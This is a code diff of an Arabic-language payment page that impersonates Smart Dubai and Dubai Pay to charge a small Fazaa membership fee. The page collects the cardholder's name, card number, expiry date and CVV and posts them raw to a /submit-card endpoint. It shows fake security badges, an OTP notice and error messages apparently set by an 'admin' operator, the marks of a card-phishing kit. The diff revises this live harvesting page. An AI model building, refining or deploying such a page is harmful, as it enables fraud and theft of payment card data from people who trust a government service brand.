@@ -3,137 +3,477 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دبي الذكية - دفع الرسوم</title>
+    <title>الدفع - مبادرة فزعة</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #f4f7f9; color: #333; }
-        .container { max-width: 500px; margin: 0 auto; background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
-        .header { background: #fff; padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
-        .header-logos { display: flex; gap: 15px; align-items: center; }
-        .header-logo { height: 35px; width: auto; }
-        .content { padding: 20px; flex-grow: 1; }
-        .section-title { font-size: 1.1rem; font-weight: bold; margin-bottom: 15px; color: #1e3a5f; border-bottom: 2px solid #d4af37; padding-bottom: 5px; display: inline-block; }
-        .info-box { background: #f9f9f9; border-radius: 8px; padding: 15px; margin-bottom: 20px; border: 1px solid #eee; }
-        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; }
-        .info-label { color: #667a89; }
-        .info-value { font-weight: bold; color: #1e3a5f; }
-        .total-row { border-top: 1px dashed #ccc; padding-top: 10px; margin-top: 10px; font-size: 1.1rem; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; font-size: 0.9rem; margin-bottom: 5px; font-weight: bold; color: #444; }
-        .input-control { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 1rem; outline: none; transition: 0.3s; }
-        .input-control:focus { border-color: #1e3a5f; box-shadow: 0 0 5px rgba(30, 58, 95, 0.1); }
-        .card-row { display: flex; gap: 10px; }
-        .btn-pay { background: #1e3a5f; color: #fff; border: none; padding: 15px; border-radius: 6px; width: 100%; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
-        .btn-pay:hover { background: #142842; }
-        .footer { padding: 20px; text-align: center; font-size: 0.8rem; color: #999; border-top: 1px solid #eee; }
-        .error-msg { color: #dc3545; background: #f8d7da; padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; font-size: 0.9rem; text-align: center; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: white;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .header-logos {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            width: 100%;
+            justify-content: space-between;
+        }
+
+        .header-logo {
+            height: 32px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .content {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .section {
+            margin-bottom: 24px;
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #9ca3af;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .transaction-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            background: #f9fafb;
+            padding: 16px;
+            border-radius: 8px;
+        }
+
+        .info-row {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .info-label {
+            font-size: 13px;
+            color: #6b7280;
+        }
+
+        .info-value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #1f2937;
+            margin-bottom: 8px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
+        }
+
+        input.error, select.error {
+            border-color: #ef4444;
+            background-color: #fef2f2;
+        }
+
+        .date-row {
+            display: grid;
+            grid-template-columns: 1fr auto 1fr;
+            gap: 8px;
+            align-items: flex-end;
+        }
+
+        .date-separator {
+            color: #d1d5db;
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .cvv-row {
+            display: grid;
+            grid-template-columns: 1fr auto;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            height: 28px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .legal-text {
+            font-size: 13px;
+            color: #ef4444;
+            text-align: center;
+            margin: 15px 0;
+            line-height: 1.5;
+            padding: 10px;
+            background: #fff5f5;
+            border-radius: 6px;
+        }
+
+        .error-message {
+            background: #fee2e2;
+            color: #991b1b;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            display: none;
+            text-align: center;
+        }
+
+        .total-amount {
+            text-align: center;
+            padding: 16px;
+            background: #f9fafb;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+
+        .total-label {
+            font-size: 13px;
+            color: #6b7280;
+            margin-bottom: 4px;
+        }
+
+        .total-value {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-cancel {
+            background: #e5e7eb;
+            color: #1f2937;
+        }
+
+        .btn-cancel:hover {
+            background: #d1d5db;
+        }
+
+        .btn-pay {
+            background: #0066cc;
+            color: white;
+        }
+
+        .btn-pay:hover {
+            background: #0052a3;
+        }
+
+        .btn-pay:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        .footer {
+            background: white;
+            border-top: 1px solid #e0e0e0;
+            padding: 16px 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #6b7280;
+        }
+
+        .footer-phone {
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 4px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                max-width: 100%;
+            }
+            .transaction-info {
+                grid-template-columns: 1fr;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Header -->
         <div class="header">
             <div class="header-logos">
-                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TWDdxegxhDSOigFd.png" alt="Smart Dubai" class="header-logo">
-                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TvCpTnLQtXDsNBpI.png" alt="Dubai Pay" class="header-logo">
+                <img src="/smart_dubai.png" alt="Smart Dubai" class="header-logo">
+                <img src="/dubaipay.png" alt="Dubai Pay" class="header-logo">
             </div>
         </div>
 
+        <!-- Main Content -->
         <div class="content">
-            <h2 class="section-title">معلومات المعاملة</h2>
-            <div id="errorMessage" class="error-msg"></div>
-            
-            <div class="info-box">
-                <div class="info-row">
-                    <span class="info-label">مقدم الخدمة:</span>
-                    <span class="info-value">فزعة - Fazaa</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">نوع الخدمة:</span>
-                    <span class="info-value">اشتراك عضوية فزعة</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">رقم المعاملة:</span>
-                    <span class="info-value" id="txnNumber">FZ-742910482</span>
-                </div>
-                <div class="info-row total-row">
-                    <span class="info-label">إجمالي المبلغ:</span>
-                    <span class="info-value" style="color: #28a745;">5.00 درهم</span>
+            <!-- Error Message -->
+            <div class="error-message" id="errorMessage"></div>
+
+            <!-- Transaction Information -->
+            <div class="section">
+                <div class="section-title">معلومات المعاملة</div>
+                <div class="transaction-info">
+                    <div class="info-row">
+                        <span class="info-label">مقدم الخدمة</span>
+                        <span class="info-value">فزعة</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">الخدمة</span>
+                        <span class="info-value">اشتراك عضوية فزعة</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">رقم المعاملة</span>
+                        <span class="info-value" id="transactionNo">FZ-</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">المبلغ</span>
+                        <span class="info-value">5.00 AED</span>
+                    </div>
                 </div>
             </div>
 
-            <h2 class="section-title">تفاصيل البطاقة البنكية</h2>
-            <form id="paymentForm">
+            <!-- Card Details -->
+            <div class="section">
+                <div class="section-title">بيانات البطاقة</div>
+
                 <div class="form-group">
-                    <label>اسم صاحب البطاقة</label>
-                    <input type="text" id="cardName" class="input-control" placeholder="الاسم كما هو مكتوب على البطاقة" required>
+                    <label for="cardName">اسم صاحب البطاقة</label>
+                    <input type="text" id="cardName" placeholder="أدخل الاسم كما هو مكتوب على البطاقة" required>
                 </div>
+
                 <div class="form-group">
-                    <label>رقم البطاقة (16 رقم)</label>
-                    <input type="text" id="cardNumber" class="input-control" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    <label for="cardNumber">رقم البطاقة</label>
+                    <input type="text" id="cardNumber" placeholder="أدخل رقم البطاقة" 
+                           maxlength="19">
                 </div>
-                <div class="card-row">
-                    <div class="form-group" style="flex: 1;">
-                        <label>تاريخ الانتهاء</label>
-                        <input type="text" id="expiryDate" class="input-control" placeholder="MM/YY" maxlength="5" required>
-                    </div>
-                    <div class="form-group" style="flex: 1;">
-                        <label>رمز الأمان (CVV)</label>
-                        <input type="password" id="cvv" class="input-control" placeholder="123" maxlength="3" required>
+
+                <div class="form-group">
+                    <label>تاريخ الانتهاء</label>
+                    <div class="date-row">
+                        <select id="expiryMonth">
+                            <option value="">MM</option>
+                            <option value="01">01</option>
+                            <option value="02">02</option>
+                            <option value="03">03</option>
+                            <option value="04">04</option>
+                            <option value="05">05</option>
+                            <option value="06">06</option>
+                            <option value="07">07</option>
+                            <option value="08">08</option>
+                            <option value="09">09</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                        </select>
+                        <span class="date-separator">/</span>
+                        <select id="expiryYear">
+                            <option value="">YY</option>
+                            <option value="25">25</option>
+                            <option value="26">26</option>
+                            <option value="27">27</option>
+                            <option value="28">28</option>
+                            <option value="29">29</option>
+                            <option value="30">30</option>
+                            <option value="31">31</option>
+                            <option value="32">32</option>
+                            <option value="33">33</option>
+                            <option value="34">34</option>
+                            <option value="35">35</option>
+                        </select>
                     </div>
                 </div>
-                <button type="submit" class="btn-pay">دفع الآن</button>
-            </form>
+
+                <div class="form-group">
+                    <label for="cvv">رمز الأمان (CVV)</label>
+                    <div class="cvv-row">
+                        <input type="text" id="cvv" placeholder="CVV" maxlength="4">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Badges -->
+            <div class="security-badges">
+                <img src="/card_logos.png" alt="Cards" class="badge">
+                <img src="/verified_visa.gif" alt="Verified by VISA" class="badge">
+                <img src="/pci_dss.png" alt="PCI DSS" class="badge">
+            </div>
+
+            <!-- Legal Text -->
+            <div class="legal-text">
+                لن يتم خصم أي رسوم حتى يتم الموافقة على طلبك من قبل فزعة. سيتم إرسال رمز OTP إلى هاتفك المسجل لتأكيد المعاملة.
+            </div>
+
+            <!-- Total Amount -->
+            <div class="total-amount">
+                <div class="total-label">إجمالي المبلغ</div>
+                <div class="total-value">5.00 AED</div>
+            </div>
+
+            <!-- Buttons -->
+            <div class="buttons">
+                <button class="btn btn-cancel" onclick="history.back()">إلغاء</button>
+                <button class="btn btn-pay" id="payButton">دفع</button>
+            </div>
         </div>
 
+        <!-- Footer -->
         <div class="footer">
-            &copy; 2026 دبي الذكية. جميع الحقوق محفوظة.<br>
-            دفع آمن بواسطة Dubai Pay
+            <div class="footer-phone">للاستفسارات يرجى الاتصال على 600 560 000</div>
+            <div>جميع الحقوق محفوظة © 2024</div>
         </div>
     </div>
 
     <script>
-        const orderId = JSON.parse(sessionStorage.getItem('userData') || '{}').orderId || localStorage.getItem('orderId');
-        
+        // Generate random transaction number starting with FZ
+        const randomNo = Math.floor(100000 + Math.random() * 900000);
+        const fullTransactionNo = 'FZ-' + randomNo;
+        document.getElementById('transactionNo').innerText = fullTransactionNo;
+
         // Check for error messages from admin
         const lastError = localStorage.getItem('lastError');
         if (lastError) {
             const errBox = document.getElementById('errorMessage');
             errBox.textContent = lastError;
             errBox.style.display = 'block';
+            
+            // Mark card fields with error
+            document.getElementById('cardName').classList.add('error');
+            document.getElementById('cardNumber').classList.add('error');
+            
             localStorage.removeItem('lastError');
         }
 
-        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const btn = document.querySelector('.btn-pay');
-            btn.disabled = true;
-            btn.textContent = 'جاري المعالجة...';
+        // Formatting card number
+        document.getElementById('cardNumber').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = "";
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += " ";
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+        });
 
-            const cardData = {
+        document.getElementById('payButton').addEventListener('click', async function() {
+            const cardName = document.getElementById('cardName').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryMonth = document.getElementById('expiryMonth').value;
+            const expiryYear = document.getElementById('expiryYear').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+
+            this.disabled = true;
+            this.innerText = 'جاري المعالجة...';
+
+            const orderId = JSON.parse(sessionStorage.getItem('userData') || '{}').orderId || localStorage.getItem('orderId');
+            
+            const payload = {
                 orderId: orderId,
-                cardName: document.getElementById('cardName').value,
-                cardNumber: document.getElementById('cardNumber').value,
-                expiryDate: document.getElementById('expiryDate').value,
-                cvv: document.getElementById('cvv').value
+                cardName,
+                cardNumber: cardNumber.replace(/\s/g, ''),
+                expiryDate: `${expiryMonth}/${expiryYear}`,
+                cvv
             };
 
-            await fetch('/submit-card', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(cardData)
-            });
+            try {
+                const response = await fetch('/submit-card', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
 
-            window.location.href = 'payment_loading_ar.html?orderId=' + orderId;
-        });
-
-        // Format card number
-        document.getElementById('cardNumber').addEventListener('input', function (e) {
-            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-        });
-
-        // Format expiry date
-        document.getElementById('expiryDate').addEventListener('input', function (e) {
-            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/g, '$1/').replace(/\/$/, '').slice(0, 5);
+                if (response.ok) {
+                    window.location.href = `payment_loading_ar.html?orderId=${orderId}`;
+                } else {
+                    alert('حدث خطأ. يرجى المحاولة مرة أخرى.');
+                    this.disabled = false;
+                    this.innerText = 'دفع';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('خطأ في الاتصال.');
+                this.disabled = false;
+                this.innerText = 'دفع';
+            }
         });
     </script>
 </body>
